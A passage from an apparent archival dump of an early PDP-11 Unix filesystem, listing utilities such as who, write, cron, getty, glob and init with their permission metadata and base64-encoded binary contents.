1gvAC+cCzhW6DN8J3gE3ChwFwQF3CW4E5gsMAfUL+P8EAsAVAQB3AGoEfZ34/wQAtQoEAP
cJnAM1EPj/wCUKAO0CPYoEAAAK7gF3CTgE5gvAHdwEwRVIBjcQXgQRIP4CeQAGAPcLygQO
AzcKxAQdAfcLvgQIAhkBzh2yBOYVegbfCUYD1gs3CqgEBAFOHfj/3wn4BECfBAC1CgQANR
D4//UCzhUKAN8J+AR3AOYDdwnUA+YLTh0EAN8JkgI1EAQATh0GAN8JkgI1EAYAQJ8EALUK
BAA1EPj/CQNAnwYAtQoGAEAt+P/yAwAKBwH9iwYA+wK3CjwEwBUBAHcAlgN3CYQDxuUEAA
AKNRD2/zUQ+P9AHfj/tQr4/8AtlAMPBkAd9v+1Cvb/wC2IAxsH/YsEABgDtQoEAPMBtQoE
AP2lIAAEAPoD/aUJAAQA9gP9pSAABADeA/2lCQAEANoD/YsEAAQCQB0EAHcAKgO1CgQA7g
F3CRIDxuUEADUK9v8MAfUlCQD4/xIFQR32/1dwCgBBbfj/dRD2/0CfBADAZdD/NRD4/7UK
BADAC+oEQB32/3cA4gJ3CdACxuV+AHcdBABQDUQRxGUGAMCfRg0JA7cKQA0XICUABgMOEN
8J+AT0AXcAsgI3CiwNNwosDdevIg0tAAQCtwoaDbcKGA33CCgBdxAMDTcKDg0XIC4ABAL3
CBYBdxACDYMRw2UEAMEVgAZCFNoDESD8AkoAARUFBAEL05UtAAEBARX3CQIAUgEAChdyCg
BmEAEQAgP3CfD/gBXAZTAAE5CHABOVAQLDChOVQALDCj4BwR2uDAMKAhPSiwIDgwpEfgIV
OAHCFagGAgHCFawGARUFA/cLjAwCA9OVMAAACvcJAgAkAWYQCnYCA/cJ9v+AFYBMAgDAZT
AAFyA5AAIHwGUHABOQhwDAHVgMwh1SDPcJlAAMAcAdSgzCHUQM9wmGAAUBBBU3FTQMdwDm
/oIRwmUEAIPgJhHmFSAAxBADC8NtGAwGB/cLFgwDAt8J+ATDfsQLBAOOlN8J+AQEf8MLBQ
fOFSAA3wn4BMN+1guEFXcAoP43CuoLAQrAn+ALtwrcC8DlMAAXIPr/AgIAFQMBFyAJAAaC
twrIC1dwCgABYOwBwGUwAIMAxGUIANOVPwCHAGYRhRHAHbALBAL3CSwAwB2mC1CdBAAHA7
cKnAv3CpYLAgb3CRQAQB0EAIUVhwBmEYUR9wkEAIUVhwDAHXoLCgPA5bIQNxB0AcAdaAsB
AoAKAImwBvcVshBeC/cVAAJWC9ctUAsCAAOC9xUBAEgLhwBmEYUR9wpaAQ4E9xXOBlQBwB
1MAQOJzgYAAgyHwAsKA8AKNxA8AQAKwN84AbcKNAGFFYcANxAuAwAKNwokAYUVhwBmEYUR
QB0EAAaJAoZ3AHwAAAqFFYcAZhGFEXcdBADuAHcdBgDqAACJtgYChncAXACFFYcAZhGFEU
AdBAApiQKGdwBIAIUVhwBmEYURdx0EAMIAdx0GAL4AAIm8BgKGdwAqAIUVhwBmEYURQB0E
AAGJQBGFESYR5hCmEOYLSABBEUQYQxhCGEYRhRWHADcQlALAFf//RhGFFYcAAAAAAGMAZA
B1AAAADAIEAvgBGgJjYW5ub3Qgb3BlbiAlcwoAY2Fubm90IGNyZWF0ZSAlcwoAJTRkIAAA
vANkABIEbwAMBHgATgRmAFwEZQDqA2MA+ANzAMgDbABqBHIAAAAAAPz/8P/9//j/BImyEA
AACIkAAAAABYkAAAAA
-- /bin/who mode=0100775 uid=3 gid=3 atime=174929371 mtime=174923940 base64=1 --
BwGeBs4AYgQAAAAAAAABAAnwgBEmEtALNhACAPcJCAAOEN8JqgIBiXcJsAXG5Q4A9RWeBv
j/9SUCAAQABQJAHQYANRwCAPj/DgpmHfj/3wlIAtYLNRDy/wkEzhURAOYVqAbfCYgC1gv3
CU4CzhUBAN8JNAI3ECIJzhUBAN8JHgL1JQMABAAFAg4K3wn2BTUQ7v/OFQAC5hVsB2Yd8v
/fCWYCliU1EPT/EQL3CT4B9SUDAAQACQLOFQgA5hW6BuYd2AjfCYgCliX3Ce4B9RVsB+z/
9RVsB+z/9eUQAPT/9Qv0/9cF9SUDAAQABwJAHez/AJwIAEAt7v9eAv2L7P8EAvUlAQAEAF
cDNQrw/0Ad7P9AbfD/yIsGAkAd7P9AbfD/yJUgAEAd7P9AbfD/AJIOEN8JrgG1CvD/9SUI
APD/5gY1CvD/QB3w/wCcwwYOEN8JrgG1CvD/9SUDAPD/8wZAHez/AJwIAA4Q3wmuAU4d7P
/OZQoA3wm0AjUQ9v/1FQMA8P9AHfb/QG3w/wCSDhDfCa4BtQrw//UlEADw//IGzhUKAN8J
rgH1JQMABAAEAvcJOgD3CQQB9WUQAOz/jQFmEYURwB3YBwQC9wksAMAdzgdQnQQABwO3Cs
QH9wq+BwIG9wkUAEAdBACFFYcAZhGFEfcJBACFFYcAwB2iBwoDwOWQCTcQ1gTAHZAHAQKA
CgCJyAb3FZAJhgf3FQACfgfXLXgHAgADgvcVAQBwB4cAZhGFEUAdBAAGiQKGdwC6AwAKhR
WHAGYRhRFAHQQAKYkChncApAOFFYcAZhGFEXcdBAB+BHcdBgB6BACJzgYChncAhgOFFYcA
ZhGFEUAdBAB3HQYAYgR3HQgAXgQAidQGAoZ3AGQDhRWHAGYRhRFAHQQAdx0GAEYEdx0IAE
IEAInaBgKGdwBCA4UVhwBmEYURQB0EAAGJdwkUA04dBADfCcoCDhDfCcAEdwAQA3cJ/gLG
5QgARBHEZfL/TB8EAEAdBAA0HAIAAgDAHQ4EAAsOECYR3wmEBtYLDhHfCeQDAxDCHA4A9R
V3APj/9RUvAfb/8yVKAAoABAPzJUsACgAOAsAcCgAXdAIANRzYBfj/wBwKABd0AgA1HNoF
9v9OHfj/5hDfCaYD1gs1EPj/Th32/+YQ3wmmA9YLNRD2//cLoAMgA0It+P8HBUIt+P8aAv
MlAgAEABYGQi32/wcGQi32/xAC8yUBAAQADAfOFRAOJhHfCYQG1gsOEd8J5AMDELMKEADA
EHcANAJ3CSICRB0EAEMdBgDDJToABwYOHQoA3wliBcBlk/4DYMEQAe0OAAFtDADBZbwCwA
0XcgcAZhDAEIDldwD2AXcJ5AHOFYBwQB0EACYcAgBmHwQA3wliBpYlBBDDHcgHwhWQC8EQ
wA0XcjwAUhDBEMANF3I8AAMQwRDADRdyPABSEMEQwA0XcjwAAxABEcANF3IDAFd0AwBDYA
ERwA0XcgMABBDSEAERwWUEAMANF3IHAHcQQgfDFUYABQHOEN8JYgUE4IMKzhDfCWIFACH2
BPcQIgc3ESIHzhDfCWIFwCVuAQMC9xUdAFQCAwoFAcAQwAwE7OAGgwrAEMAMMCHgBvYE9x
UcADYCABGAChIQ0hA3CugGwBWQC3cAGgF3CQgBxBVsCcMVEAfUlP4CQR0EAEEcDABXcAMA
QxDDZSoHxBVsCdSU1JTUlIQKQh0EAMJlCACBEldwAwBDEMNlQAfUlNSU1JSOGCYR3wmCBd
YLBBCOGM5lZAAmEd8JggXWCwQQjhjOZWQAJhHfCYIF1gsEEI4YzmVkACYR3wmCBdYLBBDE
ZQIAQB0EAA4cCgAmEd8JggXWCwQQwBVsCXcAeAB3CWYAQR0EAMANF3IEAMELBALAFW4Bdw
BeAMAVbQH7AXcJRgBEHQQAhAr1JQoABgAOBkEdBgDADRdyCgABEMANF3IKAMFlMABAEBSQ
AgHUlSAAQR0GAMANF3IKAMFlMABAEBSQABF3AA4AQBGFESYR5hCmEOYLSABBEUQYQxhCGE
YRhRWHADcQmgPAFf//RhGFFYcAZhGFEUAdBAD3CQYAhRWHAAAK9xV4ALwF5gsciaILIofO
HYoFBYlmBwAAHIcBEEAQA4miCxAAFIcXIBAAEQLAFaILDiT0AhckdHTxAhekeQDuAtCL7A
MXogAA6QI3mHQFQBAGidYLwJ1qBYcAgB0CAIEdBAA2cgYAdxBaBYcAgB0CAIEdBAA2cgYA
QBCHAGYRhRFAHQQA9QsGAMENUGBIbQYAYAuFFYcAL2V0Yy91dG1wAGNhbm5vdCBvcGVuIH
d0bXAKAE5vYm9keS4KAHR0eQAABImQCQAABYkAAAAAA4kAAAAABIkAAAAAHwAcAB8AHgAf
AB4AHwAfAB4AHwAeAB8AUEYIBwwHAQAFAE0BOgAvAUVTVABFRFQARGF5IE1vbiAwMCAwMD
owMDowMCAxOTAwCgBTdW5Nb25UdWVXZWRUaHVGcmlTYXQASmFuRmViTWFyQXByTWF5SnVu
SnVsQXVnU2VwT2N0Tm92RGVjAAAvZGV2AAA=
-- /bin/write mode=0100775 uid=3 gid=3 atime=174923945 mtime=174923945 base64=1 --
BwF+AhoAaAAAAAAAAAABAJclAgAKAwYGwBUBAASJrwEKAAGJt58EAG0C1guFFQWJ0AEAAA
aGwBUBAASJuQERAAGJNxCeAsAdmgIDiZoCEADACwICdwAMAfeLOwIEA/etNQJOAvACwxWa
AkQRwhUJAMIKCQMTpfwD9Iv//+QC86UgAP//4AL3nSgCFAIFiYgCAQAIhxKJiAKqAgSH9z
UCABwCBgLAFQEABIn/ARMAAYk3EPQBAAr3CXgBAxDEHfoBwB0gAhOJAAAAAMAdFgIDiZoC
EADAC2MD9yDWAfYCwBWaAsEVCADQpSAAAgPBCvsCAQvBZQgAdxCYAcAdqgEEie4BEQDAHa
ABAIl+AsAdmAEEicwBBAAwiQIAggEACgOJ0gIBAMALNQP3C2gBDQPXLbABIQAJAgKJNgEH
icAVAQAEicoBAgDqATcKSAHXLZIBCgACArcKPAHAHUwBBInSAgEA3AF3lXoBBgPAFQEABI
nSAgEA9wH3ix0BBQPAFQEABImGAgIAwBUBAASJ3gEQAAGJwB0SAQSJ2gEEAAGJ9xU/PwYB
qgELiaQBngEBiaQBrAEAAC9iaW4vc2gALXQAQXJnIGNvdW50CkNhbm5vdCBvcGVuIHV0bX
AKIQouLi4KL2V0Yy91dG1wAEVPVAogbm90IGxvZ2dlZCBpbi4KCgcHB01lc3NhZ2UgZnJv
bSBQZXJtaXNzaW9uIGRlbmllZC4KZhGFEUAdBAD3CQYAhRWHAAAK9xV4ANQA5gscidYCIo
fOHaIABYmSAgAAHIcBEEAQA4nWAhAAFIcXIBAAEQLAFdYCDiT0AhckdHTxAhekeQDuAtCL
7AMXogAA6QI3mIwAQBAGidYLwJ2CAIcABImaAgIAAQAgAC9kZXYvdHR5eAAvZGV2AAA=
-- /dev mode=0140775 uid=3 gid=3 atime=177300290 mtime=177300290 --
-- /dev/kmem mode=0120664 uid=3 gid=3 atime=174916253 mtime=169257706 major=2 minor=1 --
-- /dev/mem mode=0120664 uid=3 gid=3 atime=174928583 mtime=169257706 major=2 minor=0 --
-- /dev/null mode=0120666 uid=3 gid=3 atime=168455830 mtime=169257706 major=1 minor=0 --
-- /dev/tty8 mode=0120622 uid=0 gid=0 atime=174929915 mtime=174929915 major=4 minor=8 --
-- /etc mode=0140775 uid=3 gid=3 atime=174929352 mtime=174921454 --
-- /etc/cron mode=0106774 uid=1 gid=1 atime=174922703 mtime=174922703 base64=1 --
BwGICxYBagAAAAAAAAABAAnwgBEmEtALNhACAPcJCAAOEN8JdAcBiXcJBgvOFQEA3wnQBf
cJggQ3EHQMAgP3CUIH9wm0B84V/AfmFQEA3wnmBdYLzhWgDN8JAgcIAcAdUAz3CkwMwAsC
AvcKQgzOFaAM3wkgCMgL8gL3CdABxBU8AM4VoAzfCSAINxAmDMIVCA05ATcKHgzAHRgMDh
wCAKYQ3wkeAdYLAhDAHQYMDhwEAKYQ3wkeAdYLAhDAHfQLDhwGAKYQ3wkeAdYLAhDAHeIL
DhwIAKYQ3wkeAdYLAhDAHdALDhwMAKYQ3wkeAdYLAhD3C8ALBQL3CaIAjhDfCbYB0ov+Ao
CSwCX8/8MCwx2gC8NlPADDLZgLAoO3CpAL9xCOC8QKrQL3CXIApgF3CQAKRB0EAACVwOX9
/xcgAgAmgsAMeACMCwCVQC0GAAYCAJXAJf7//AIAEQgBAJPAJf7/8gK3Ck4LABGACncA0A
kAk0AtBgAFBQCdAQBALQYAAge3CjALABHAZQIA7wEAnf//QC0GAOADtwoaC90BdwmQCcbl
BABOEc5l9v/fCQIHxB3+CkTt+P/ECwMHDhHfCfQGdwB6CXcJaAn3CewCwAsDA/cJbAU5AQ
QKAQGECkAdBAAAYciL+gIOCt8JWgTOFYAB5h2kCd8JcATWCw4RZh0EACYK3wlSB5YlDgrf
CVoEDgrmHYQJ3wlqBdYLzh16Cd8JGAf3CZICwAsCA/cJVAUOCuYVuwvmFbgL5hWwC98Jjg
TGZQYA9wk6BXcA8gh3CeAIxuUeAk4RzmX0/eYdOAnfCcIE1gvACwsEzhUSAOYVvgvmFQEA
3wlSB5Yl9wkEBcIVCA33CyYKAgK3ECAKtRDe/YAQwGVkAMAtEgoHhvdlAAIKCs4dBgrfCb
AFBApfAMgDNQrc/RIBwyU5ABIFQR3c/VdwCgDBYMFl0P91ENz9ThHOZfT93wkmBQMQwyUw
AOsH9Qvc/RAF9SVkANz9DAXDJSwAIQPDJS0ATwPDJQkAaAPDJSAAZQNCHd79wyUKAL4Dww
sCB18ASgROHfT93wlaBNKV/P/Slfz/txCACY4Q3wmwBXcACAjSlf7/Up3c/TUK3P1OEc5l
9P3fCSYFAxDDJTAAFQf1C9z91gX1JWQA3P3SBVKd3P3DJSwA6QPDJQkAAwPDJSAAxwLSlf
7/KwHDJTkA6AVBHdz9V3AKAMFgwWXQ/3UQ3P3VAdKV/f9Sndz9NQrc/U4RzmX0/d8JJgUD
EMMlMAAsB/UL3P2lBfUlZADc/aEFwyUJAAMDwyUgAJsCUp3c/YQKThHOZfT93wkmBQMQwy
UgAPcDwyUJAPQDwwuKB8MlCgCHA8QlBQAlA8MlKgACA18AogLSlf//4wHDJTkA0QVBHdz9
V3AKAMFgwWXQ/3UQ3P2+AcMLAgZfAPgCwyUlAAICwxUKANKQThHOZfT93wkmBQMQwyUKAO
0C0pUKABKKXwB+Ak4RzmX0/d8JJgUDEF8A/AJmEYURQB0EAAaJAoZ3ANQGAAqFFYcAZhGF
EXcdBABaB3cdBgBWBwCJ0gsChncAtAaFFYcAZhGFEXcdBABCB0ARwGUGADcQOgcAidgLdw
CUBmYRhRECiQMBBYZ3AIYGNxAKCAAKhRWHAGYRhRF3HQQAFAcAid4LSodBHQYAERARCgAK
hRWHADcKxAdmEYURQR0EAPHlAgACAA8EVywCAP//BwVmngQA9wlCAEAcBAAHAfcJOADxCg
IAQBwEACaUNpQBADEQBACAFYUVhwBmEYURQR0EAPEKAgACBPcJDgAACkDeBACxCgQAhRWH
AEAQwGUGADcQlgYxEAQAQBIAieQLBYfACgOBMRACAIcAdwDUBWYRhRF3HQQAeAZ3HQYAdA
YAieoLAoZ3ALoFhRWHAGYRhRH3HWQGYAZ3bQQAWgYAifALAoZ3AJwFwB1OBndtBABIBoUV
hwBmEYURdx0EADgGAInwCwKGdwB6BXcdBAAqBgAKhRWHAGYRhRFAHQQAF4kChncAXgUACo
UVhwBmEYURQR0EAFcgFAAfhkAdBgB3EPwFwQxmHMgMMRDIDDcQ8AUJA8A1AQAGAsEMwQzB
ZT4GdxDcBQCJ9gsKh8A1AQABAw4QgBWFFYcAwBUWACYK1gt3AAAFJhDAHYQGTAEmEMAdfg
ZIASYQwB14BkQBJhDAHXIGQAEmEMAdbAY8ASYQwB1mBjgBJhDAHWAGNAEmEMAdWgYwASYQ
wB1UBiwBJhDAHU4GKAEmEMAdSAYkASYQwB1CBiABJhDAHTwGHAEmEMAdNgYYASYQwB0wBh
QBJhDAHSoGEAEmEMAdJAYMASYQwB0eBggBJhDAHRgGBAEmEMAdEgYAAWYQphDmECYRyAmE
FYMVghWBFYAVBgBmEYURQB0EACOJhRWHAGYRhRENiaYQQh0EABIQUhCCFYUVhwBmEYURdx
0EANwEAIn8CwKGdwASBAAKhRWHAGYRhRH3CUQAJhAHiQOG1gt3APgD1gsCA30QBACFFYcA
ZhGFEUAdBAB3HQYAogR3HQgAngQAiQAMAoZ3AM4DhRWHAGYRhRFAHQQAAYlmEUEdAgCFEQ
AKdyz8/3gEAgLAFQIAdyJyBAMCwGUCACIBdyJoBAMCwGUEABwBdyJeBAMCQGwCABYBdyJW
BAUCQWwCAMFlBADmAXesAQBJBAoCJhBAEsAAF3T5/wFgwWUCAIAV2AGADIUVhwB3CTQDdx
H+BHcdAgD6BHcANAPFHfAE9R3uBAIAdwAmA3cJFANOHQQA3wkgCA4Q3wkWCncAEAN3Cf4C
xuUIAEQRxGXy/0wfBABAHQQANBwCAAIAwB3wAwALDhAmEd8JbgvWCw4R3wk6CQMQwhwOAP
UVdwD4//UVLwH2//MlSgAKAAQD8yVLAAoADgLAHAoAF3QCADUcEAv4/8AcCgAXdAIANRwS
C/b/Th34/+YQ3wn8CNYLNRD4/04d9v/mEN8J/AjWCzUQ9v/3C4IDIANCLfj/BwVCLfj/Gg
LzJQIABAAWBkIt9v8HBkIt9v8QAvMlAQAEAAwHzhUQDiYR3wluC9YLDhHfCToJAxCzChAA
wBB3ADQCdwkiAkQdBABDHQYAwyU6AAcGDh0KAN8JuArAZZP+A2DBEAHtDgABbQwAwWW8As
ANF3IHAGYQwBCA5XcA9gF3CeQBzhWAcEAdBAAmHAIAZh8EAN8JTAuWJQQQwx2sA8IV9AzB
EMANF3I8AFIQwRDADRdyPAADEMEQwA0XcjwAUhDBEMANF3I8AAMQARHADRdyAwBXdAMAQ2
ABEcANF3IDAAQQ0hABEcFlBADADRdyBwB3EFADwxVGAAUBzhDfCbgKBOCDCs4Q3wm4CgAh
9gT3EDADNxEwA84Q3wm4CsAlbgEDAvcVHQA2AgMKBQHAEMAMBOwYDIMKwBDADDAhGAz2BP
cVHAAYAgARgAoSENIQNwr2AsAV9Ax3ABoBdwkIAcQVqgzDFUgM1JT+AkEdBABBHAwAV3AD
AEMQw2ViDMQVqgzUlNSU1JSECkIdBADCZQgAgRJXcAMAQxDDZXgM1JTUlNSUjhgmEd8J2A
rWCwQQjhjOZWQAJhHfCdgK1gsEEI4YzmVkACYR3wnYCtYLBBCOGM5lZAAmEd8J2ArWCwQQ
xGUCAEAdBAAOHAoAJhHfCdgK1gsEEMAVqgx3AHgAdwlmAEEdBADADRdyBADBCwQCwBVuAX
cAXgDAFW0B+wF3CUYARB0EAIQK9SUKAAYADgZBHQYAwA0XcgoAARDADRdyCgDBZTAAQBAU
kAIB1JUgAEEdBgDADRdyCgDBZTAAQBAUkAARdwAOAEARhREmEeYQphDmC0gAQRFEGEMYQh
hGEYUVhwA3EGYBwBX//0YRhRWHAIAdAgCBHQQANnIGAHcQqgGHAIAdAgCBHQQANnIGAEAQ
hwBmEYURQB0EAPULBgDBDVBgSG0GAGALhRWHAJILowtgAUwBSAEvdXNyL2xpYi9jcm9udG
FiAC90bXAvY3JvbnRtcAAvYmluL3NoAHNoAC10AGNhbm5vdCBvcGVuIHRhYmxlCgAACIkA
AAAAC4kAAAAABYkAAAAAA4kAAAACBYkAAAAAEYkAAAgNMIkAAAAACokAAASJAAAAAN8JAA
DWC5YlxmUAAHcA6vP/AR8AHAAfAB4AHwAeAB8AHwAeAB8AHgAfAFBGQAxEDAEABQBNAToA
LwFFU1QARURUAERheSBNb24gMDAgMDA6MDA6MDAgMTkwMAoAU3VuTW9uVHVlV2VkVGh1Rn
JpU2F0AEphbkZlYk1hckFwck1heUp1bkp1bEF1Z1NlcE9jdE5vdkRlYwAA
-- /etc/dtab mode=0100666 uid=3 gid=3 atime=170480283 mtime=169257935 base64=1 --

-- /etc/getty mode=0100774 uid=3 gid=3 atime=174922989 mtime=174922989 base64=1 --
CAHAAsoAIgAAAAAAAAABAAnwgBEmEtALNhACAPcJCAAOEN8JegIBiXcJaALDFTAA9SUBAA
QABARAHQYAA54CAMQVACDMIAUDxGUOAMQlVCD5gsQlVCACgsQVACA3nQgAeCA3nQoAcyA3
HQQAcCA3nQgAZiA3nQoAYSDOFcogJgrfCToC1gsOHQwA3wnYAc4VyiAmCt8JOgLWC/cJag
DACzAD95UjADQg95VAAC8gNx0GACog9ws4IAMD91UQAB4g9wsuIAMD91UEABIg9wskIAMD
90UEAAYgzhXKICYK3wk6AtYLDgrmFdAg5hWqIOYVnyDfCfwBxmUGAM4VAQDfCXoCAx0CAJ
wBdwmIATcK4B83Ct4fNwrcH8QV0CDOFQEA5hXqICYK3wkYApYlwAsDBg4K3wl6AsMdwB/D
RYD/wwsDAgAKdwBaAc4VAQDmFeog5hUBAN8JWAKWJcMlYQAbBsMlegAYBbcKih8HAcMlWg
AVBbcKfB/DZSAA1JAcAc4VAQDmFbAg5hUBAN8JWAKWJbcKXB8mAcMlQQDoB8MlIwAFAsQl
0CAHhsQKBQHDJUAA5ALEFdAgwyUKAAYDwyUNAAMDxCXgIKqGJIrDJQ0A1wPOFQEA5hWyIO
YVAQDfCVgCliXAFQEArgF3CagARB0EAAkBzhUBACYRhArmFQEA3wlYApYlzIv1AncAlgBm
EYURdx0EALAeQBHAZQYANxCoHgCJtCB3AIgAZhGFEUAdBAB3HQYAlh53HQgAkh4AibogAo
Z3AGoAhRWHAGYRhRFAHQQAdx0GAHoeAInAIAKGdwBOAAAKhRWHAGYRhRFAHQQAdx0GAGAe
dx0IAFweAInEIAKGdwAqAIUVhwBmEYURQB0EAAGJQBGFESYR5hCmEOYLSABBEUQYQxhCGE
YRhRWHADcQQh7AFf//RhGFFYcAAAAAAAAAAAAAAAAAAAAAAAAAMAABAOARyBAHAAcAVCAB
AAIA4BGIZQUABQBhIAIAMADgEd4QAwADAHAgLQAtAOAR3hADAAMAeiAxADEA4BGIZQUABQ
CEIDIAMgDgEdpADQANAJMgCg0bOwdsb2dpbjogAAoNGzoGBg9sb2dpbjogAAoNbG9naW46
IAAKDWxvZ2luOiAACg0bOgYGD2xvZ2luOiAACg0bO2xvZ2luOiAAL2Jpbi9sb2dpbgBsb2
dpbgAKAA0AC4kAAAAAA4kAAAAAH4kAAASJAAAAAA==
-- /etc/glob mode=0100775 uid=3 gid=3 atime=174929709 mtime=174923003 base64=1 --
CAHABJIAtAMAAAAAAAABAAnwgBEmEtALNhACAPcJCAAOEN8JaAQBiXcJVgT1JQMABAAFB8
4VCgDmFRggQAH1ZQIABgB/HwYAxh/3ZQIAwB8HAfVlAgAGAE4fBgDfCbwA9QoEAPUlAgAE
APMH9wvOIwUCzhUJAOYVIyAhAc4VniLmHSoi3wnqAdYLzh0gIuYVLSDfCXoD1gsEEM4Vni
ImEc5lBADfCeoB1gvOFZ4iJhHfCeoB1gvOFRMA5hU3IOYVAgDfCUYEliV3AMQDdwmyA+YL
Qx0EAMQQy6UqABQDy6U/ABEDy6VbAA4D04v1As4VSyAmEd8JegPWCz8QEh/3ZQIADB9YAQ
MhPQIOCuYVTCDfCQYE1gsCEMQVTiDCCwsEzhUNAOYVUSDmFQIA3wlGBJYl9wlCA/Ud1h74
/84VEADmFTQkphDfCSQEliXAJRAAKwL3C+4i8gPOEOYVNiTfCUYC1gvAC+oDzhU2JCYR3w
l6A9YLPxCYHvdlAgCSHrcKvCLcAeOlLwC+AguKDgrEIAMC5hVPIAEBJhHfCQYE1gsCENOV
gAC6AY4Q3wnIA04d+P/fCaoBdwDWAncJxAJEHQQAEwEDEQoBzhImE98JWAPWC8ALAwcCE8
wSixDDZQIAwy0sHvGCxGUCAMAdIh7AZf7/ACHnh3cAlgJ3CYQCQx0GAEQdBADOECYR3wne
A9YL9yUIACYiCAILEeMVXyDOEOYS3wneA9YL9yUHAA4iAgL3CQQAdwBYAncJRgLOFRIA5h
VnIOYVAgDfCUYEliX3CSYCdwA6AncJKAL9pS4ABAAHAv2lLgAGAAMDAAp3ACACTh0GAGYd
BADfCXAC1gv2AXcJ/gHG5QgARB0EAEMdBgAClQYDwkWA/8ILAgLCFYAAwJQ1EPj/wRUEID
cQbh0RIP4CeQAIADUK9P/1Ff9/8v8jAfUlXQD2/woC9Qv0/yADzhAmEd8JcALWC3cAsgH1
JS0A9v8JArUg8v8OBcCUNRD4/4AgBwcIAUAd9v81EPL/gCACArUK9P/AlDUQ9v/ZAgAK4w
G1IPj/+wLCC/kD2AHOEMQKJhHfCSYD1gHCC/ACwBUBANIBdwlIAf2LBgAOAsAVAQAPAU4d
BgBmHQQAtQoEAN8JcALWC8AL8gL9iwQA8gIACncAKAF3CRYBRB0EAEMdBgDUogUC04v8Ag
AKdwAOAQCZwZJA4PoBdwn0AMMdgBxEHQQAApULA8MlnCIChvcJlP7CRYD/wgsUAtOVLwBE
HQYAwyWcIgKG9wl6/gKVk5DCC/cCxB1IHPcQRBwAEXcAvACTkN8BZhGFEUAdBAAGiQKGdw
C2AAAKhRWHAGYRhRF3HQQAlBx3HQYAkBz3Cz4gBQPmFRDw5hX+AwYAAIl6IHcAiABmEYUR
dx0EAHIcdx0GAG4cAImAIAKGdwBuAIUVhwBmEYURQB0EAHcdBgBWHHcdCABSHACJhiAChn
cATACFFYcAZhGFEUAdBAB3HQYAOhx3HQgANhwAiYwgAoZ3ACoAhRWHAGYRhRFAHQQAAYlA
EYURJhHmEKYQ5gtIAEERRBhDGEIYRhGFFYcANxCaH8AV//9GEYUVhwAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACeIpIgAAAqAD8AWwAAABwDEAMKA6YCBANBcmcg
Y291bnQKAE5vIG1hdGNoCgAvdXNyL2Jpbi8AQ29tbWFuZCBub3QgZm91bmQuCgAALgAALw
BObyBkaXJlY3RvcnkKAC9iaW4vc2gAQXJnIGxpc3QgdG9vIGxvbmcKAAuJAAAAAAWJAAAA
AAOJAAAAAASJAAAAAA==
-- /etc/group mode=0100644 uid=3 gid=3 atime=172643493 mtime=169257936 --
other::1:
bin::3:root,bin
-- /etc/init mode=0100774 uid=0 gid=3 atime=174929915 mtime=169271448 base64=1 --
CAFAB7YA1gAAAAAAAAABAAnwgBEmEtALNhACAPcJCAAOEN8JYAYBiXcJ2gb3CU4EwCUY9k
0D9wksBAQQGQIOCuYVVCDfCZYE1gsOCt8JJgQOCt8JJgQOCuYVFiDmFQwg5hUMIN8JOgTG
ZQYA9wkABvcJugUAIfwCzhWkAeYVMiDfCQgE1gsOEN8J8gPOFQEA5hU8IN8JlgTWCwQQGQ
XOFQIAJgomEd8J1gSWJfeVfgCcIM4VQCHfCQgGzhUQAOYVNiEmEd8JPgaWJQ4R3wnyA/cJ
EgbOFegG5hUBAN8J+gTWCwQKDhHfCfIDhArEJQoA+Qb3CYgDwRUAIDcQFh8RIP4CeQAEAM
4dvB/fCfIDwiW+IGQC9wkOAfcJSgMEEBQCzhUCAOYVSiDfCZYE1gsOCt8JJgQOCuYVFCDm
FQwg3wk6BJYl9wkoBfcJ4gQAIfwC9wnSAA4K5hUUIOYVHiDfCToEliX3CZAFDgrmFSgg3w
mWBNYLNxBOH8IVviATAYMgEYLEEosSChGzHAIAAgCzHAQABADyHTIfAgDynS4fBADCZQYA
9wnCAMALrQP3JTAAFh/4A8MVviDDJTYh84PzLQgfAgDcA/MLAgDZA8NlBgDzAY4Q3wkyAs
JlBgDCJTYh+ILDFb4g8wsCAAUDywsDAs4Q3wmiAsNlBgDDJTYh84L3CSoEBBDDFb4gwyU2
IfiDCyEGAs4Q3wkSA84Q3wmiAsNlBgDyAXcJ3ATEFb4gDhHfCTICxGUGAMQlNiH4gncA0g
R3CcAERB0EAMwLCQMOEd8JEgPOFQkAJhPfCXgE1gsMCjQKAgB3AKoEdwmYBM4VBADmFUoh
5h1MHt8JtASWJcAlBAAEAvelCgDRHgMDAAp3AIAEwJ3CHjcQLB7AnbseNxAmHsCdtB43EC
AewBUBAO8BdwlQBEIdBAD3CagBBBAtAg4K5hUBAN8J+gTWC8MVViCznAIACAAOCuYQ3wnS
A9YLzhWSAeYQ3wmyA9YLzhUCAOYQ3wmWBNYLDgrfCSYEDgqmEM5lBADmFRQg5hVgIN8JOg
TGZQYA9wlUAwoRdwDyA3cJ4APOFQEA5hUyIN8JlgTWCwMQHwVAHQQABBwCAMQlYQACBsRl
2f8OCgARwGXQ/xd0BAAmEOYQ3wnWBJYlzhUQAOYVTiHmEN8JPgaWJc4Q3wnyA84VAQDmFT
wg3wmWBNYLAxAbBUAdBAA3nAIAvB3OFUAh3wkIBs4VAgAmCuYQ3wnWBJYlzhUQAOYVNiHm
EN8JPgaWJc4Q3wnyA3cAUgNmEYURdx0EALAcdx0GAKwcAIlqIAKGdwBGAwAKhRWHAGYRhR
F3HQQAlhx3HQYAkhwAiXAgAoZ3ACYDAAqFFYcAZhGFEUAdBAAGiQKGdwAQAwAKhRWHAGYR
hRF3HQQAZhx3HQYAYhwAiXYgAoZ3APAChRWHAGYRhRFAHQQAKYkChncA3AKFFYcAZhGFEX
cdBAA6HEARwGUGADcQMhwAiXwgdwC8AmYRhRECiQMBBYZ3AK4CNxD2HAAKhRWHAGYRhREm
iYUVhwBmEYURgB0EALcdBgD+GwCJgiAChncAggIACoUVhwBmEYURdx0EAOgbdx0GAOQbAI
mGIAKGdwBiAoUVhwBmEYURQB0EAHcdBgDMG3cdCADIGwCJjCAChncAQAKFFYcAZhGFEUAd
BAB3HQYAsBt3HQgArBsAiZIgAoZ3AB4CAAqFFYcAZhGFEUEdBABXIBQAH4ZAHQYAdxCKG8
EMZhxgITEQYCE3EH4bCQPANQEABgLBDMEMwWVSBXcQahsAiZggCofANQEAAQMOEIAVhRWH
AMAVFgAmCtYLdwDAASYQwB0IHEwBJhDAHQIcSAEmEMAd/BtEASYQwB32G0ABJhDAHfAbPA
EmEMAd6hs4ASYQwB3kGzQBJhDAHd4bMAEmEMAd2BssASYQwB3SGygBJhDAHcwbJAEmEMAd
xhsgASYQwB3AGxwBJhDAHbobGAEmEMAdtBsUASYQwB2uGxABJhDAHagbDAEmEMAdohsIAS
